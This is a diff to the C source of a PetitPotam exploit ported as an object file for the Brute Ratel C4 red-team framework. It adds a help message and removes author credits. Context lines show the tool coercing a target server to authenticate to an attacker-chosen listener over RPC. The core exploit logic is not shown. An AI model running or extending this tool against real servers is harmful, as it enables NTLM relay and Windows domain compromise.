@@ -213,6 +213,11 @@ LPWSTR ConvertToWideChar(const char* input) {
 	return wideStr;
 }
 
+void printHelp(){
+	BadgerDispatch(g_dispatch, "[*] Usage: petitpotam.o <listener> <target>\n");
+	BadgerDispatch(g_dispatch, "[*] <listener>    Capture server ip or hostname\n");
+    BadgerDispatch(g_dispatch, "[*] <target>      Target server ip or hostname\n");
+}
 
 void coffee( char ** argv, int argc, WCHAR** dispatch) {
 	g_dispatch = dispatch;
@@ -231,8 +236,16 @@ void coffee( char ** argv, int argc, WCHAR** dispatch) {
 	PEXIMPORT_CONTEXT_HANDLE pContextHandle = NULL;
 	ENCRYPTION_CERTIFICATE_HASH_LIST* pEncCertHashList = NULL;
 
+	// Help check
+	for (int i = 0; i < argc; i++) {
+		if(BadgerStrcmp(argv[i], "-h") == 0){
+			printHelp();
+			return;
+		}
+	}
+
 	if(argc < 2){
-		BadgerDispatch(g_dispatch, "[-] Usage: petitpotam.o <listener> <target>\n");
+		printHelp();
         return;
 	}
 
@@ -247,10 +260,6 @@ void coffee( char ** argv, int argc, WCHAR** dispatch) {
 		BadgerDispatch(g_dispatch, "[-] Could not convert target to wchar\n");
         goto cleanup;
     }
-
-	BadgerDispatch(g_dispatch, "[>] PetitPotam exploit by Cneelis @Outflank\n");
-	BadgerDispatch(g_dispatch, "[>] Based on original code by @topotam77\n");
-	BadgerDispatch(g_dispatch, "[>] Ported to BRC4 by @rtecCyberSec\n\n");
 
 	MSVCRT$wcscat_s(wcRPCTarget, _countof(wcRPCTarget), lpwTarget);
 	rStatus = CreateBindingHandle(wcRPCTarget, &bHandle);
